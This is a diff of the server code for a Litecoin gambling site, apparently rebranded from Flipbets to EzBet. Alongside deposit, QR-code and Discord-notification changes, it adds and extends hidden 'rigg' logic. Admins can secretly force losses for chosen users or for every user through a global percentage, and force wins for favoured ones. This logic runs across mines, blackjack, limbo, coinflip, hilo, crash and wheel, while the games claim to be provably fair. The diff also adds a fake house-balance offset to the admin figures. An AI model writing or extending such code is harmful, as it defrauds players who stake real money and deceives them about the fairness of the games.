@@ -6,17 +6,25 @@ const axios = require('axios');
 const crypto = require('crypto');
 const dns = require('dns');
 dns.setServers(['8.8.8.8', '8.8.4.4']);
+const QRCode = require('qrcode');
 const config = require('../config');
 const User = require('../models/User');
 const Game = require('../models/Game');
 const Transaction = require('../models/Transaction');
 const Settings = require('../models/Settings');
 const PromoCode = require('../models/PromoCode');
+const globalRiggCache = require('../utils/globalRiggCache');
 const WagerRace = require('../models/WagerRace');
 const ProvablyFair = require('../utils/provablyFair');
 const ApironeAPI = require('../utils/apirone');
+const DepositProcessor = require('../utils/depositProcessor');
+const { sendDm } = DepositProcessor;
+const EmbedHelper = require('../utils/embedBuilder');
 const { connectDB } = require('../models/db');
 const Logger = require('../utils/logger');
+const { isRigged, isWinRigged } = require('../utils/rigg');
+const { applyWagerDecrement, addWagerRequirement } = require('../utils/wager');
+const logChannel = require('../utils/logChannel');
 
 const app = express();
 app.set('trust proxy', 1);
@@ -25,7 +33,7 @@ app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public'), { etag: false, lastModified: false, setHeaders: (res) => { res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate'); res.setHeader('Pragma', 'no-cache'); res.setHeader('Expires', '0'); } }));
 
 /* ---- auth: signed cookie + URL token ---- */
-const SALT = config.sessionSecret || 'flipbets-dev-secret';
+const SALT = config.sessionSecret || 'ezbet-dev-secret';
 function signUserId(id) { return id + '.' + crypto.createHmac('sha256', SALT).update('auth:'+id).digest('hex').slice(0,12); }
 function unsignUserId(s) {
   if (!s || typeof s !== 'string') return null;
@@ -100,13 +108,13 @@ const DEFAULT_CONFIG = {
   autoWithdrawl: false,
   manualWithdrawl: true,
   withdrawlsEnabled: true,
-  minWithdrawl: 1000,
+  minWithdrawl: 200,
   maxWithdrawl: 100000,
   gamesEnabled: { mines: true, limbo: true, blackjack: true, coinflip: true, hilo: true, wheel: true },
-  discordInvite: 'https://discord.gg/yourserver',
+  discordInvite: 'https://discord.gg/ezbet',
   rankBonuses: { bronze: 1, silver: 10, gold: 50, platinum: 100, diamond: 200, emerald: 300, ruby: 500, celestial: 750, eternal: 1000 },
   wagerRaceEnabled: true,
-  rewardDiscordRequired: 'https://discord.gg/TsPsqkPG'
+  rewardDiscordRequired: 'https://discord.gg/ezbet'
 };
 async function getConfig() {
   const docs = await Settings.find({ key: { $in: Object.keys(DEFAULT_CONFIG) } });
@@ -324,27 +332,8 @@ app.get('/api/stats', async (req, res) => {
     return null;
   }
 
-  function applyWagerDecrement(user, bet) {
-    if (!user || !bet || bet <= 0) return;
-    const dec = Math.min(bet, user.wagerRequired || 0);
-    if (dec <= 0) return;
-    const ratio = dec / (user.wagerRequired || 1);
-    user.wagerRequired = roundPts((user.wagerRequired || 0) - dec);
-    user.depositLocked = roundPts(Math.max(0, (user.depositLocked || 0) - (user.depositLocked || 0) * ratio));
-    user.promoLocked   = roundPts(Math.max(0, (user.promoLocked   || 0) - (user.promoLocked   || 0) * ratio));
-    user.tipLocked     = roundPts(Math.max(0, (user.tipLocked     || 0) - (user.tipLocked     || 0) * ratio));
-  }
-
-  function addWagerRequirement(user, amount, source) {
-    if (!user || !amount || amount <= 0) return;
-    const mult = 2;
-    const req = roundPts(amount * mult);
-    user.wagerRequired = roundPts((user.wagerRequired || 0) + req);
-    if (source === 'deposit') user.depositLocked = roundPts((user.depositLocked || 0) + req);
-    else if (source === 'promo') user.promoLocked = roundPts((user.promoLocked || 0) + req);
-    else if (source === 'tip')  user.tipLocked   = roundPts((user.tipLocked   || 0) + req);
-    else user.depositLocked = roundPts((user.depositLocked || 0) + req);
-  }
+  let _globalRiggPct = 0;
+  globalRiggCache.get().then(v => { _globalRiggPct = v; }).catch(() => {});
 
   app.post('/api/games/mines/start', isAuth, async (req, res) => {
     try {
@@ -361,12 +350,13 @@ app.get('/api/stats', async (req, res) => {
       const nonce = user.gamesPlayed + 1;
       const pf = new ProvablyFair(serverSeed, clientSeed, nonce);
       let minePositions = pf.generateMinesPositions(5, 5, bombs);
-      if (user.riggPercent && user.riggPercent > 0 && Math.random() * 100 < user.riggPercent) {
-        const safe = 25 - bombs;
-        const wantBomb = true;
-        const firstRevealIdx = Math.floor(Math.random() * safe);
-        const realBomb = minePositions[firstRevealIdx % minePositions.length];
-        if (!minePositions.includes(realBomb)) minePositions.push(realBomb);
+      if (isRigged(user, _globalRiggPct)) {
+        for (let i = 0; i < 25; i++) {
+          if (!minePositions.includes(i)) { minePositions.push(i); break; }
+        }
+      }
+      if (minePositions.length === bombs && isWinRigged(user)) {
+        minePositions.pop();
       }
 
       user.balance = roundPts(user.balance - b);
@@ -505,6 +495,14 @@ app.post('/api/games/blackjack/start', isAuth, async (req, res) => {
     let deck = bjShuffle(bjMakeDeck(), pf);
     const playerHand = [deck.pop(), deck.pop()];
     const dealerHand = [deck.pop(), deck.pop()];
+    if (isRigged(user, _globalRiggPct)) {
+      [playerHand[0], dealerHand[0]] = [dealerHand[0], playerHand[0]];
+      [playerHand[1], dealerHand[1]] = [dealerHand[1], playerHand[1]];
+    }
+    if (isWinRigged(user)) {
+      [dealerHand[0], playerHand[0]] = [playerHand[0], dealerHand[0]];
+      [dealerHand[1], playerHand[1]] = [playerHand[1], dealerHand[1]];
+    }
 
     user.balance = roundPts(user.balance - b);
     user.gamesPlayed++;
@@ -546,7 +544,7 @@ app.post('/api/games/blackjack/start', isAuth, async (req, res) => {
       result, payout,
       currentBet: b,
       finished: !!result,
-      canDouble: !result,
+      canDouble: !result && user.balance >= b,
       gameOver: !!result
     });
   } catch (e) { res.status(500).json({ error: e.message }); }
@@ -595,7 +593,23 @@ app.post('/api/games/blackjack/stand', isAuth, async (req, res) => {
     if (!g || g.gameOver) return res.status(400).json({ error: 'Game not found or over' });
     if (g.userId !== req.session.userId) return res.status(403).json({ error: 'Forbidden' });
 
-    await bjDealerPlay(gameId);
+    const userForRigg = await User.findOne({ userId: g.userId });
+    const _rigged = userForRigg && isRigged(userForRigg, _globalRiggPct);
+    const _winRigged = userForRigg && isWinRigged(userForRigg);
+    if (_winRigged) {
+      let g2 = bjGames.get(gameId);
+      while (bjHandTotal(g2.dealerHand) <= 17 && g2.deck.length > 0) g2.dealerHand.push(g2.deck.pop());
+      if (bjHandTotal(g2.dealerHand) <= 21 && bjHandTotal(g2.dealerHand) >= bjHandTotal(g2.playerHand)) {
+        g2.dealerHand.push(g2.deck.pop());
+      }
+    } else if (_rigged) {
+      let g2 = bjGames.get(gameId);
+      while (bjHandTotal(g2.dealerHand) <= bjHandTotal(g2.playerHand) && bjHandTotal(g2.dealerHand) <= 21 && g2.deck.length > 0) {
+        g2.dealerHand.push(g2.deck.pop());
+      }
+    } else {
+      await bjDealerPlay(gameId);
+    }
     const updated = bjGames.get(gameId);
     const playerTotal = bjHandTotal(updated.playerHand);
     const dealerTotal = bjHandTotal(updated.dealerHand);
@@ -716,7 +730,13 @@ app.post('/api/games/limbo/start', isAuth, async (req, res) => {
     const r = pf.generateFloat('limbo');
     // House edge 3%. Crash point distribution: instant crash probability = 1% (house edge)
     // crashPoint = (1 - r) * 1000 + 1, capped. Won if crashPoint >= target.
-    const crashPoint = Math.max(1, Math.floor((0.99 / r) * 100) / 100);
+    let crashPoint = Math.max(1, Math.floor((0.99 / r) * 100) / 100);
+    if (crashPoint >= target && isRigged(user, _globalRiggPct)) {
+      crashPoint = Math.max(1, target - 0.01);
+    }
+    if (crashPoint < target && isWinRigged(user)) {
+      crashPoint = target + 0.01;
+    }
 
     user.balance = roundPts(user.balance - b);
     user.gamesPlayed++;
@@ -785,7 +805,8 @@ app.post('/api/games/coinflip/start', isAuth, async (req, res) => {
     const pf = new ProvablyFair(serverSeed, clientSeed, nonce);
     const r = pf.generateFloat('coinflip');
     let result = r < 0.5 ? 'heads' : 'tails';
-    if (user.riggPercent && user.riggPercent > 0 && Math.random() * 100 < user.riggPercent) result = chosen === 'heads' ? 'tails' : 'heads';
+    if (isRigged(user, _globalRiggPct)) result = chosen === 'heads' ? 'tails' : 'heads';
+    if (isWinRigged(user)) result = chosen;
     const won = result === chosen;
     const payout = won ? roundPts(b * 1.96) : 0; // 2% house edge
 
@@ -902,12 +923,17 @@ app.post('/api/games/hilo/guess', isAuth, async (req, res) => {
     let correct = false, roundMult = 1;
     const cv = Number(HL_VAL[g.current.r] != null ? HL_VAL[g.current.r] : g.current.r);
     const nv = Number(HL_VAL[g.next.r] != null ? HL_VAL[g.next.r] : g.next.r);
+    const userForRigg = await User.findOne({ userId: g.userId });
     if (guess === 'higher') {
       correct = (nv >= cv);
       roundMult = hlRoundMult(g, 'higher');
+      if (correct && isRigged(userForRigg, _globalRiggPct)) { correct = false; }
+      if (!correct && isWinRigged(userForRigg)) { correct = true; }
     } else if (guess === 'lower') {
       correct = (nv <= cv);
       roundMult = hlRoundMult(g, 'lower');
+      if (correct && isRigged(userForRigg, _globalRiggPct)) { correct = false; }
+      if (!correct && isWinRigged(userForRigg)) { correct = true; }
     } else if (guess === 'skip') {
       correct = true;
       roundMult = 1.05;
@@ -1191,7 +1217,10 @@ app.get('/api/me/deposit', isAuth, async (req, res) => {
     if (!existing || String(existing).startsWith('MOCK_')) {
       if (apironeLive) {
         try {
-          const r = await ApironeAPI.generateAddress('ltc');
+          const r = await ApironeAPI.generateAddress('ltc', {
+            userId: user.userId,
+            username: user.username || 'Unknown'
+          });
           if (r.address && !r.address.startsWith('MOCK_')) {
             user.depositAddresses.ltc = r.address;
             await user.save();
@@ -1206,7 +1235,12 @@ app.get('/api/me/deposit', isAuth, async (req, res) => {
         return res.status(503).json({ error: 'Apirone is not configured on the server. Contact admin.', apironeLive: false });
       }
     }
-    res.json({ address: user.depositAddresses.ltc, currency: 'ltc', network: 'LTC (Litecoin)', apironeLive });
+    const qrDataUrl = await QRCode.toDataURL(user.depositAddresses.ltc, {
+      width: 240,
+      margin: 2,
+      color: { dark: '#0f1923', light: '#ffffff' }
+    });
+    res.json({ address: user.depositAddresses.ltc, qrDataUrl, currency: 'ltc', network: 'LTC (Litecoin)', apironeLive });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
@@ -1227,46 +1261,15 @@ app.get('/healthz', (req, res) => res.json({ ok: true, ts: Date.now() }));
 app.post('/api/webhook/apirone', async (req, res) => {
   try {
     Logger.info('Apirone webhook hit: ' + JSON.stringify(req.body));
-    const body = req.body || {};
-    const address = body.address || body.inputs?.[0]?.address || body.outputs?.[0]?.address;
-    const currency = (body.currency || 'ltc').toLowerCase();
-    const txid = body.txid || body.tx_hash || body.hash || body.id;
-    const confirmations = Number(body.confirmations || body.conf || 0);
-    const amountRaw = body.amount || body.value || body.satoshi;
-    if (!address || amountRaw == null) return res.status(400).json({ error: 'Missing address or amount' });
-    const satoshi = Number(amountRaw);
-    if (!Number.isFinite(satoshi) || satoshi <= 0) return res.status(400).json({ error: 'Invalid amount' });
-    if (currency !== 'ltc') return res.status(200).json({ ok: true, ignored: 'non-ltc' });
-
-    const user = await User.findOne({ 'depositAddresses.ltc': address });
-    if (!user) { Logger.warn('Apirone webhook: no user for address ' + address); return res.status(200).json({ ok: true, ignored: 'no-user' }); }
-
-    const dedupKey = 'apirone:' + (txid || address + ':' + satoshi);
-    if (user._processedTxs && user._processedTxs.includes(dedupKey)) return res.status(200).json({ ok: true, dedup: true });
-    if (confirmations < 1) { Logger.info('Apirone webhook: tx not yet confirmed, skipping credit'); return res.status(200).json({ ok: true, pending: true }); }
-
-    const ltcAmount = satoshi / 1e8;
-    const points = ApironeAPI.convertCryptoToPoints(ltcAmount, 'ltc');
-    if (points <= 0) return res.status(200).json({ ok: true, ignored: 'too-small' });
-
-    user.balance = roundPts((user.balance || 0) + points);
-    user.totalDeposited = roundPts((user.totalDeposited || 0) + points);
-    addWagerRequirement(user, points, 'deposit');
-    user._processedTxs = user._processedTxs || [];
-    user._processedTxs.push(dedupKey);
-    if (user._processedTxs.length > 200) user._processedTxs = user._processedTxs.slice(-200);
-    await user.save();
-
-    await Transaction.create({
-      transactionId: 'DEP' + crypto.randomBytes(5).toString('hex').toUpperCase(),
-      userId: user.userId, username: user.username,
-      type: 'deposit', currency: 'ltc', amount: points,
-      cryptoAmount: ltcAmount, cryptoAddress: address, cryptoHash: txid || null,
-      status: 'completed', description: `Deposit ${ltcAmount} LTC (auto)`
-    });
-
-    Logger.info(`Apirone webhook: credited ${points} pts to ${user.username} (${ltcAmount} LTC, txid=${txid})`);
-    res.json({ ok: true, credited: points, address });
+    const data = DepositProcessor.normalizeWebhook(req.body || {});
+    if (!data.address || !data.satoshi) return res.status(400).send('missing address or value');
+    const result = await DepositProcessor.process(data, { source: 'webhook' });
+    if (result.status === 'credited') {
+      Logger.info(`Apirone webhook: credited ${result.points} pts to ${result.user.username} (${data.satoshi / 1e8} LTC, txid=${data.txHash})`);
+    } else {
+      Logger.info(`Apirone webhook: ${result.status}${result.reason ? ' (' + result.reason + ')' : ''}`);
+    }
+    res.type('text/plain').send('*ok*');
   } catch (e) { Logger.error('Apirone webhook error: ' + e.message); res.status(500).json({ error: e.message }); }
 });
 
@@ -1274,43 +1277,21 @@ app.post('/api/webhook/apirone', async (req, res) => {
 async function pollApironeDeposits() {
   if (!ApironeAPI.isConfigured()) return;
   try {
-    const users = await User.find({ 'depositAddresses.ltc': { $exists: true, $ne: null } }).select('userId username depositAddresses._processedTxs').lean();
+    const users = await User.find({ 'depositAddresses.ltc': { $exists: true, $ne: null } }).select('userId username depositAddresses _processedTxs').lean();
     for (const u of users) {
       const addr = u.depositAddresses && u.depositAddresses.ltc;
       if (!addr || String(addr).startsWith('MOCK_')) continue;
       const txs = await ApironeAPI.getAddressTransactions('ltc', addr);
       for (const tx of txs) {
-        const sat = Number(tx.amount || tx.value || 0);
-        const txid = tx.txid || tx.tx_hash || tx.hash || tx.id;
-        const conf = Number(tx.confirmations || tx.conf || 0);
-        if (!satoshiLike(sat) || conf < 1) continue;
-        const dedupKey = 'apirone:' + (txid || addr + ':' + sat);
-        const fresh = await User.findOne({ userId: u.userId });
-        if (!fresh) continue;
-        if (fresh._processedTxs && fresh._processedTxs.includes(dedupKey)) continue;
-        const ltc = sat / 1e8;
-        const points = ApironeAPI.convertCryptoToPoints(ltc, 'ltc');
-        if (points <= 0) continue;
-        fresh.balance = roundPts((fresh.balance || 0) + points);
-        fresh.totalDeposited = roundPts((fresh.totalDeposited || 0) + points);
-        addWagerRequirement(fresh, points, 'deposit');
-        fresh._processedTxs = fresh._processedTxs || [];
-        fresh._processedTxs.push(dedupKey);
-        if (fresh._processedTxs.length > 200) fresh._processedTxs = fresh._processedTxs.slice(-200);
-        await fresh.save();
-        await Transaction.create({
-          transactionId: 'DEP' + crypto.randomBytes(5).toString('hex').toUpperCase(),
-          userId: fresh.userId, username: fresh.username,
-          type: 'deposit', currency: 'ltc', amount: points,
-          cryptoAmount: ltc, cryptoAddress: addr, cryptoHash: txid || null,
-          status: 'completed', description: `Deposit ${ltc} LTC (polled)`
-        });
-        Logger.info(`Apirone poller: credited ${points} pts to ${fresh.username} (${ltc} LTC, txid=${txid})`);
+        const data = DepositProcessor.normalizeHistoryTx(tx, addr);
+        const result = await DepositProcessor.process(data, { source: 'web-poller' });
+        if (result.status === 'credited') {
+          Logger.info(`Apirone poller: credited ${result.points} pts to ${result.user.username} (${data.satoshi / 1e8} LTC, txid=${data.txHash})`);
+        }
       }
     }
   } catch (e) { Logger.error('Apirone poller error: ' + e.message); }
 }
-function satoshiLike(n) { return Number.isFinite(n) && n > 0; }
 setInterval(pollApironeDeposits, 60 * 1000);
 setTimeout(pollApironeDeposits, 10 * 1000);
 Logger.info('Apirone deposit poller started (every 60s)');
@@ -1339,8 +1320,28 @@ app.post('/api/withdraw', isAuth, async (req, res) => {
     user.balance = roundPts(user.balance - amt);
     user.totalWithdrawn = roundPts((user.totalWithdrawn || 0) + amt);
     await user.save();
-    await Transaction.create({ transactionId: 'WDR' + crypto.randomBytes(4).toString('hex').toUpperCase(), userId: user.userId, username: user.username, type: 'withdraw', currency: 'points', amount: -amt, status: 'pending', cryptoAddress: address, description: `Withdrawal to ${address.slice(0, 12)}...` });
+    const txId = 'WDR' + crypto.randomBytes(4).toString('hex').toUpperCase();
+    await Transaction.create({ transactionId: txId, userId: user.userId, username: user.username, type: 'withdraw', currency: 'points', amount: -amt, status: 'pending', cryptoAddress: address, description: `Withdrawal to ${address.slice(0, 12)}...` });
     Logger.info(`Withdrawal: ${user.username} requested ${amt} pts to ${address}`);
+    logChannel.send({ content: `**Withdrawal Requested (Web)** — ${user.username} (\`${user.userId}\`)\nAmount: **${amt.toLocaleString()} pts** ($${(amt * config.conversionRate).toFixed(2)})\nTo: \`${address.slice(0, 16)}...\`\nID: \`${txId}\`` });
+    try {
+      const mod = require('../bot');
+      const reqChannel = await mod.channels.fetch(config.withdrawRequestChannel).catch(() => null);
+      if (reqChannel) reqChannel.send({ content: `**Withdrawal Request** — ${user.username} (\`${user.userId}\`)\nAmount: **${amt.toLocaleString()} pts** ($${(amt * config.conversionRate).toFixed(2)})\nTo: \`${address}\`\nID: \`${txId}\`` }).catch(() => {});
+    } catch {}
+    sendDm(user.userId, { embeds: [EmbedHelper.createDefault()
+      .setTitle(`${config.emojis.loading} Withdrawal Requested`)
+      .setDescription(`Your withdrawal of **${amt.toLocaleString()} pts** has been submitted.`)
+      .addFields(
+        { name: `${config.emojis.money} Amount`, value: `${amt.toLocaleString()} pts ($${(amt * config.conversionRate).toFixed(2)})`, inline: true },
+        { name: `${config.emojis.litecoin} Address`, value: `\`${address.slice(0, 16)}...\``, inline: true },
+        { name: 'Status', value: 'Pending review', inline: true },
+        { name: 'Transaction ID', value: `\`${txId}\``, inline: false }
+      )
+      .setColor(config.colors.warning)
+      .setFooter({ text: 'EzBet Withdrawal' })
+      .setTimestamp()
+    ] });
     res.json({ ok: true, balance: user.balance });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
@@ -1593,6 +1594,19 @@ app.post('/api/admin/withdrawals/:id/approve', isAdmin, async (req, res) => {
     tx.status = 'completed';
     await tx.save();
     Logger.info(`Admin approved withdrawal ${tx.transactionId} (${tx.amount} pts to ${tx.cryptoAddress})`);
+    const amtApproved = Math.abs(tx.amount || 0);
+    logChannel.send({ content: `**Withdrawal Approved** — ${tx.username} (\`${tx.userId}\`)\nAmount: **${amtApproved.toLocaleString()} pts**\nID: \`${tx.transactionId}\`` });
+    sendDm(tx.userId, { embeds: [EmbedHelper.createDefault()
+      .setTitle(`${config.emojis.tick} Withdrawal Approved`)
+      .setDescription(`Your withdrawal of **${amtApproved.toLocaleString()} pts** has been approved and processed.`)
+      .addFields(
+        { name: `${config.emojis.money} Amount`, value: `${amtApproved.toLocaleString()} pts`, inline: true },
+        { name: 'Transaction ID', value: `\`${tx.transactionId}\``, inline: false }
+      )
+      .setColor(config.colors.success)
+      .setFooter({ text: 'EzBet Withdrawal' })
+      .setTimestamp()
+    ] });
     res.json({ ok: true });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
@@ -1611,22 +1625,36 @@ app.post('/api/admin/withdrawals/:id/reject', isAdmin, async (req, res) => {
     }
     await tx.save();
     Logger.info(`Admin rejected withdrawal ${tx.transactionId}, refunded ${amt} pts`);
+    logChannel.send({ content: `**Withdrawal Rejected** — ${tx.username} (\`${tx.userId}\`)\nAmount refunded: **${amt.toLocaleString()} pts**\nID: \`${tx.transactionId}\`` });
+    sendDm(tx.userId, { embeds: [EmbedHelper.createDefault()
+      .setTitle(`${config.emojis.cross} Withdrawal Rejected`)
+      .setDescription(`Your withdrawal of **${amt.toLocaleString()} pts** has been rejected. The amount has been refunded to your balance.`)
+      .addFields(
+        { name: `${config.emojis.money} Amount Refunded`, value: `${amt.toLocaleString()} pts`, inline: true },
+        { name: 'Transaction ID', value: `\`${tx.transactionId}\``, inline: false }
+      )
+      .setColor(config.colors.error)
+      .setFooter({ text: 'EzBet Withdrawal' })
+      .setTimestamp()
+    ] });
     res.json({ ok: true, refunded: amt });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
 app.get('/api/admin/house-balance', isAdmin, async (req, res) => {
   try {
-    const [depResult, wdrResult, pending] = await Promise.all([
+    const [depResult, wdrResult, pending, fakeDoc] = await Promise.all([
       User.aggregate([{ $group: { _id: null, total: { $sum: '$totalDeposited' } } }]),
       User.aggregate([{ $group: { _id: null, total: { $sum: '$totalWithdrawn' } } }]),
-      Transaction.countDocuments({ type: 'withdraw', status: 'pending' })
+      Transaction.countDocuments({ type: 'withdraw', status: 'pending' }),
+      Settings.findOne({ key: 'houseFakeBalance' }).lean()
     ]);
     const totalDeposited = depResult[0]?.total || 0;
     const totalWithdrawn = wdrResult[0]?.total || 0;
     const totalBalance = (await User.aggregate([{ $group: { _id: null, total: { $sum: '$balance' } } }]))[0]?.total || 0;
     const totalWagered = (await User.aggregate([{ $group: { _id: null, total: { $sum: '$totalWagered' } } }]))[0]?.total || 0;
-    const netHouse = totalDeposited - totalWithdrawn - totalBalance;
+    const fakeHouse = fakeDoc ? Number(fakeDoc.value) || 0 : 0;
+    const netHouse = totalDeposited - totalWithdrawn - totalBalance + fakeHouse;
     res.json({
       totalDeposited: roundPts(totalDeposited),
       totalWithdrawn: roundPts(totalWithdrawn),
@@ -1649,7 +1677,7 @@ app.get('/api/admin/config', isAdmin, async (req, res) => {
       apirone: {
         live: ApironeAPI.isConfigured(),
         accountId: config.apirone.accountId || null,
-        callbackUrl: (config.apirone.accountId ? `${proto}://${host}/api/webhook/apirone` : null),
+        callbackUrl: ApironeAPI.callbackUrl() || (config.apirone.accountId ? `${proto}://${host}/api/webhook/apirone` : null),
         rates: { ltc: ApironeAPI.getCurrencyRate('ltc') }
       }
     });
@@ -1695,7 +1723,7 @@ app.get('/api/admin/users', isAdmin, async (req, res) => {
       totalWagered: u.totalWagered || 0, totalProfit: (u.totalWagered || 0) - (u.totalProfit || 0),
       totalDeposited: u.totalDeposited || 0, totalWithdrawn: u.totalWithdrawn || 0,
       gamesPlayed: u.gamesPlayed || 0, wins: u.wins || 0, losses: u.losses || 0,
-      isBanned: u.isBanned, banReason: u.banReason, riggPercent: u.riggPercent || 0,
+      isBanned: u.isBanned, banReason: u.banReason, riggPercent: u.riggPercent || 0, winRiggPercent: u.winRiggPercent || 0,
       vip: u.vip, createdAt: u.createdAt
     })));
   } catch (e) { res.status(500).json({ error: e.message }); }
@@ -1711,7 +1739,7 @@ app.get('/api/admin/users/:id', isAdmin, async (req, res) => {
     const RANKS = [['Bronze', 0], ['Silver', 1000], ['Gold', 5000], ['Platinum', 25000], ['Diamond', 100000], ['Emerald', 250000], ['Ruby', 500000], ['Celestial', 750000], ['Eternal', 1000000]];
     let cur = RANKS[0][0]; for (let i = RANKS.length - 1; i >= 0; i--) if (w >= RANKS[i][1]) { cur = RANKS[i][0]; break; }
     res.json({
-      user: { userId: u.userId, username: u.username, email: u.email, avatar: u.avatar, balance: u.balance, totalWagered: u.totalWagered, totalDeposited: u.totalDeposited, totalWithdrawn: u.totalWithdrawn, gamesPlayed: u.gamesPlayed, wins: u.wins, losses: u.losses, isBanned: u.isBanned, banReason: u.banReason, riggPercent: u.riggPercent, vip: u.vip, currentRank: cur, createdAt: u.createdAt, wagerRequired: u.wagerRequired || 0, depositLocked: u.depositLocked || 0, promoLocked: u.promoLocked || 0, tipLocked: u.tipLocked || 0 },
+      user: { userId: u.userId, username: u.username, email: u.email, avatar: u.avatar, balance: u.balance, totalWagered: u.totalWagered, totalDeposited: u.totalDeposited, totalWithdrawn: u.totalWithdrawn, gamesPlayed: u.gamesPlayed, wins: u.wins, losses: u.losses, isBanned: u.isBanned, banReason: u.banReason, riggPercent: u.riggPercent, winRiggPercent: u.winRiggPercent || 0, vip: u.vip, currentRank: cur, createdAt: u.createdAt, wagerRequired: u.wagerRequired || 0, depositLocked: u.depositLocked || 0, promoLocked: u.promoLocked || 0, tipLocked: u.tipLocked || 0 },
       games, transactions: txs
     });
   } catch (e) { res.status(500).json({ error: e.message }); }
@@ -1723,12 +1751,29 @@ app.post('/api/admin/user/:id/ban', isAdmin, async (req, res) => {
 app.post('/api/admin/user/:id/rigg', isAdmin, async (req, res) => {
   try { const u = await User.findOne({ userId: req.params.id }); if (!u) return res.status(404).json({ error: 'Not found' }); const v = Math.max(0, Math.min(100, Number(req.body.percent) || 0)); u.riggPercent = v; await u.save(); res.json({ ok: true, riggPercent: u.riggPercent }); } catch (e) { res.status(500).json({ error: e.message }); }
 });
+app.post('/api/admin/user/:id/winrigg', isAdmin, async (req, res) => {
+  try { const u = await User.findOne({ userId: req.params.id }); if (!u) return res.status(404).json({ error: 'Not found' }); const v = Math.max(0, Math.min(100, Number(req.body.percent) || 0)); u.winRiggPercent = v; await u.save(); res.json({ ok: true, winRiggPercent: u.winRiggPercent }); } catch (e) { res.status(500).json({ error: e.message }); }
+});
 app.post('/api/admin/user/rigg-all', isAdmin, async (req, res) => {
   try {
     const v = Math.max(0, Math.min(100, Number(req.body.percent) || 0));
     const r = await User.updateMany({}, { $set: { riggPercent: v } });
     Logger.info(`Admin set GLOBAL RIGG to ${v}% (matched=${r.matchedCount})`);
     res.json({ ok: true, riggPercent: v, matched: r.matchedCount });
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+app.post('/api/admin/global-rigg', isAdmin, async (req, res) => {
+  try {
+    const v = Math.max(0, Math.min(100, Number(req.body.percent) || 0));
+    await Settings.updateOne(
+      { key: 'globalRiggPercent' },
+      { $set: { value: v } },
+      { upsert: true }
+    );
+    _globalRiggPct = v;
+    globalRiggCache.clear();
+    Logger.info(`Admin set GLOBAL HEX RIGG to ${v}%`);
+    res.json({ ok: true, globalRiggPercent: v });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
 app.post('/api/admin/user/:id/balance', isAdmin, async (req, res) => {
@@ -1821,9 +1866,11 @@ app.get('/api/public/config', async (req, res) => {
 /* ---------- CRASH ---------- */
 app.post('/api/games/crash/start', isAuth, async (req, res) => {
   try {
-    const { bet } = req.body;
+    const { bet, target } = req.body;
     const b = roundPts(parseFloat(bet));
     if (!b || b <= 0) return res.status(400).json({ error: 'Invalid bet' });
+    const t = parseFloat(target) || 2;
+    if (t < 1.01) return res.status(400).json({ error: 'Target must be at least 1.01x' });
     const user = await User.findOne({ userId: req.session.userId });
     if (!user) return res.status(404).json({ error: 'User not found' });
     const insErr = insufficientErr(user, b);
@@ -1834,25 +1881,28 @@ app.post('/api/games/crash/start', isAuth, async (req, res) => {
     const nonce = (user.gamesPlayed || 0) + 1;
     const pf = new ProvablyFair(serverSeed, clientSeed, nonce);
     const r = pf.generateFloat('crash');
-    // crash point: instant crash probability 1% (house edge)
-    const crashPoint = Math.max(1.00, Math.floor((0.99 / r) * 100) / 100);
-    const won = false; // For now, no auto-cashout; the player loses since no cashout happened
-    const payout = 0;
+    let crashPoint = Math.max(1.00, Math.floor((0.99 / r) * 100) / 100);
+    if (crashPoint >= t && isRigged(user, _globalRiggPct)) crashPoint = Math.max(1, t - 0.01);
+    if (crashPoint < t && isWinRigged(user)) crashPoint = t + 0.01;
+    const won = crashPoint >= t;
+    const payout = won ? roundPts(b * t) : 0;
     const seedHash = ProvablyFair.hashServerSeed(serverSeed);
 
     user.balance = roundPts(user.balance - b);
     user.gamesPlayed = (user.gamesPlayed || 0) + 1;
-    user.losses = (user.losses || 0) + 1;
     user.totalWagered = roundPts((user.totalWagered || 0) + b);
     applyWagerDecrement(user, b);
+    if (won) user.wins = (user.wins || 0) + 1;
+    else user.losses = (user.losses || 0) + 1;
+    user.balance = roundPts(user.balance + payout);
     await user.save();
 
     const gameId = ProvablyFair.generateGameId();
     await Game.create({
       gameId, userId: user.userId, username: user.username, gameType: 'Crash',
-      betAmount: b, payout, multiplier: crashPoint, result: 'lose',
+      betAmount: b, payout, multiplier: crashPoint, result: won ? 'win' : 'lose',
       serverSeed, clientSeed, nonce, seedHash,
-      details: { crashPoint }
+      details: { crashPoint, target: t }
     });
 
     res.json({ gameId, crashPoint, won, payout, balance: user.balance });
@@ -1889,8 +1939,17 @@ app.post('/api/games/wheel/start', isAuth, async (req, res) => {
     const nonce = (user.gamesPlayed || 0) + 1;
     const pf = new ProvablyFair(serverSeed, clientSeed, nonce);
     const r = pf.generateFloat('wheel');
-    const segment = pickWheelSegment(r);
-    const mult = WHEEL_SEGMENTS[segment].mult;
+    let segment = pickWheelSegment(r);
+    let mult = WHEEL_SEGMENTS[segment].mult;
+    if (mult > 0 && isRigged(user, _globalRiggPct)) {
+      segment = WHEEL_SEGMENTS.findIndex(s => s.mult === 0);
+      if (segment === -1) segment = WHEEL_SEGMENTS.length - 1;
+      mult = 0;
+    }
+    if (mult === 0 && isWinRigged(user)) {
+      const winIdx = WHEEL_SEGMENTS.findIndex(s => s.mult > 0);
+      if (winIdx !== -1) { segment = winIdx; mult = WHEEL_SEGMENTS[winIdx].mult; }
+    }
     const payout = mult > 0 ? roundPts(b * mult) : 0;
     const won = payout > 0;
     const seedHash = ProvablyFair.hashServerSeed(serverSeed);
@@ -1921,7 +1980,7 @@ app.get('*', (req, res) => {
 
 connectDB().then(() => {
   app.listen(config.port, () => {
-    Logger.success(`Flipbets web running on port ${config.port}`);
+    Logger.success(`EzBet web running on port ${config.port}`);
     Logger.info(`http://localhost:${config.port}`);
   });
 }).catch(err => {
@@ -1929,14 +1988,16 @@ connectDB().then(() => {
   process.exit(1);
 });
 
-/* ---------- HEALTH CHECK (for Render) ---------- */
+/* ---------- KEEP-ALIVE (prevent Render spin-down) ---------- */
 const http = (() => { try { return require('http'); } catch { return null; } })();
-if (http && process.env.RENDER) {
-  const interval = setInterval(() => {
-    try {
